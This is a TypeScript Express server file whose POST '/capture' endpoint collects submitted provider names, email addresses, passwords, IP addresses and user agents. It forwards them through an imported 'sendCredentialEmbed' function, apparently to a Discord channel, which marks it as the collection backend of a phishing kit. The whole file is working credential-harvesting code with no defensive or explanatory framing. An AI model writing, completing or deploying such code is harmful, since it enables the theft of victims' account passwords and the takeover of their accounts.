import express, { Request, Response } from "express";
import { sendCredentialEmbed } from "./discord.js";

const app = express();
app.use(express.json());

app.post("/capture", async (req: Request, res: Response) => {
  try {
    const { provider, email, password, ip, userAgent, timestamp } = req.body;

    if (!provider || !email || !password) {
      res.status(400).json({ ok: false, error: "Missing fields" });
      return;
    }

    const forwarded = req.headers["x-forwarded-for"] as string | undefined;
    const clientIp = forwarded?.split(",")[0]?.trim() || req.ip || "unknown";
    const clientUA = req.headers["user-agent"] || "unknown";

    await sendCredentialEmbed({
      provider,
      email,
      password,
      ip: ip || clientIp,
      userAgent: userAgent || clientUA,
      timestamp: timestamp || new Date().toISOString(),
    });

    res.json({ ok: true });
  } catch (err) {
    console.error("[API] Capture error:", err);
    res.status(500).json({ ok: false });
  }
});

app.get("/health", (_req: Request, res: Response) => {
  res.json({ status: "ok" });
});

export { app };
